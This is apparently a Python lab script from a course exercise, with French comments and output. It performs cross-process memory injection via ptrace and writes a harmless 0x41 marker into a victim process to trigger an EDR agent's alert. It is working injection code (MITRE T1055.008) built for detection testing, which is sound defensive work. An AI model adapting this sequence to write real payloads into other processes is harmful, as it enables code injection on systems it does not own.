#!/usr/bin/env python3
"""
Script "attaquant" - injection cross-processus via ptrace.
(Version mise a jour Semaine 6 : journalisation cote attaquant ajoutee)

Usage: sudo python3 attacker_poc.py <PID_victime> <adresse_hex>
"""

import ctypes
import ctypes.util
import sys
import time
import os
from attacker_log import log_attempt

if len(sys.argv) != 3:
    print(f"Usage: sudo python3 {sys.argv[0]} <PID_victime> <adresse_hex>")
    sys.exit(1)

victim_pid = int(sys.argv[1])
target_addr = int(sys.argv[2], 16)

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
libc.ptrace.restype = ctypes.c_long
libc.ptrace.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]

PTRACE_ATTACH = 16
PTRACE_POKEDATA = 5
PTRACE_CONT = 7
PTRACE_DETACH = 17

def ptrace_call(request, pid, addr, data):
    ctypes.set_errno(0)
    result = libc.ptrace(request, pid, addr, data)
    err = ctypes.get_errno()
    if result == -1 and err != 0:
        raise OSError(err, f"ptrace(request={request}) a echoue")
    return result

def wait_until_stopped(pid, timeout=3.0):
    deadline = time.time() + timeout
    status_path = f"/proc/{pid}/status"
    while time.time() < deadline:
        try:
            with open(status_path) as f:
                for line in f:
                    if line.startswith("State:"):
                        if "t (tracing stop)" in line or "T (stopped)" in line:
                            return True
        except FileNotFoundError:
            return False
        time.sleep(0.05)
    return False

start_time = time.time()
print(f"[Attaquant] PID actuel (attaquant) : {os.getpid()}")
print(f"[Attaquant] Cible (victime)        : PID {victim_pid}")
print(f"[Attaquant] Adresse ciblee         : {hex(target_addr)}")
print()

print("[Attaquant] Etape 1 : PTRACE_ATTACH sur la victime ...")
ptrace_call(PTRACE_ATTACH, victim_pid, None, None)
print("[Attaquant] Attache. Attente de l'arret effectif du processus ...")

if not wait_until_stopped(victim_pid):
    print("[Attaquant] ATTENTION : la victime ne semble pas stoppee, on continue quand meme.")
else:
    print("[Attaquant] Victime stoppee (tracing stop) confirme.")

time.sleep(0.5)

print("[Attaquant] Etape 2 : PTRACE_POKEDATA - ecriture dans la memoire de la victime ...")
harmless_value = 0x4141414141414141
ptrace_call(PTRACE_POKEDATA, victim_pid, target_addr, harmless_value)
print(f"[Attaquant] Ecriture reussie : 0x{harmless_value:016x} a l'adresse {hex(target_addr)}")

print("[Attaquant] Etape 3 : PTRACE_CONT - on relache la victime ...")
ptrace_call(PTRACE_CONT, victim_pid, None, None)

print("[Attaquant] Etape 4 : PTRACE_DETACH - detachement propre ...")
try:
    ptrace_call(PTRACE_DETACH, victim_pid, None, None)
except OSError:
    pass

total_delta = time.time() - start_time

print()
print("[Attaquant] Termine. Verifie le terminal de la victime : le contenu")
print("[Attaquant] memoire affiche devrait maintenant montrer [65, 65, 65, ...]")
print("[Attaquant] (65 = 0x41 = 'A'), preuve de l'ecriture cross-processus.")
print("[Attaquant] Verifie aussi le terminal de l'agent EDR pour l'alerte.")

# --- NOUVEAU : journalisation cote attaquant ---
log_attempt(
    technique="Injection cross-processus (ptrace)",
    mitre_id="T1055.008",
    target_pid=victim_pid,
    target_process="victim.py",
    success=True,
    details=f"Sequence ATTACH->POKEDATA->CONT->DETACH executee avec succes en {total_delta:.2f}s",
)
